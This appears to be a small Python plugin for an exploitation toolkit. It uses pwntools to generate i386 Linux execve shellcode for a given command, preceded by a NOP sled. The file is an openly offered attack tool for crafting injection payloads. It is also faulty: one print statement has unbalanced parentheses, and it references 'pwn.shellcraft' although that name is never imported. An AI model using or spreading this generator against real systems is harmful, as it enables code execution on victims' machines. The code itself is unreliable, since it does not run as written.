# Attempts to create shellcode with given format.
from pwn import *
context(arch='i386', os='linux')

def name():
    return "gen-shellcode"

def help():
    return "Generates and returns shellcode."

def args():
    return ['command', 'nops']

def run(args):
	sc = pwn.shellcraft.i386
	command = args.command
	nop_size = args.nops
	try:
		print('Shellcode for: ' + command)
		shellcode = sc.linux.execve(args.command)
		shellcode = asm(shellcode)
		print (asm(sc.nop()) * nop_size) + shellcode)
		print (shellcode)
	except:
		print("Error Generating Shellcode!")